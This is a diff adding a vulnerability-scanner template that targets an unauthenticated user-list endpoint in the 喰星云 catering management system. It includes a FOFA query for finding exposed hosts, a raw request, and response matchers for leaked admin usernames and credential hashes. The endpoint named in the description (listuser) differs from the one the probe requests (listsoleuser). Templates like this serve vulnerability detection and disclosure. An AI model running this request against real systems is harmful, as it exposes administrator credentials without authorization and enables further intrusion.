@@ -1,0 +1,36 @@
+id: huixingyun-catering-system-info-leak
+
+info:
+  name: "喰星云数字化餐饮服务系统 listuser 接口未授权访问导致敏感数据泄露"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: body="tmp_md5_pwd"
+      喰星云数字化餐饮服务系统在/chainsales/head/user/listuser接口存在未授权访问缺陷，攻击者可通过构造特定请求直接获取系统管理员账号的加密凭证数据。该接口未实施有效的身份验证机制，导致敏感信息以明文形式暴露在HTTP响应中，可能被用于后续的权限提升和横向渗透攻击。
+      
+      GET /chainsales/head/user/listuser HTTP/1.1
+      accept: */*
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+      Accept-Encoding: gzip, deflate, br
+      Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+      Cookie: PHPSESSID=v3r6hm8cvuu9ithh1veut5bavl; cookieSuid=20; cna=c6f0379d8e5f410ca142893948dc8521; ci_session=a%3A4%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%2292d181ca0deeb8bf63ed117d5dece691%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A9%3A%22127.0.0.1%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A111%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F126.0.0.0+Safari%2F537.36%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1721112088%3B%7Dff08b22f99f644290b380824c3b48c86
+      Connection: close
+  tags: 喰星云
+
+http:
+- raw:
+  - |
+    GET /chainsales/head/user/listsoleuser HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    X-Requested-With: XMLHttpRequest
+    Accept-Language: zh-CN,zh;q=0.9
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'username'
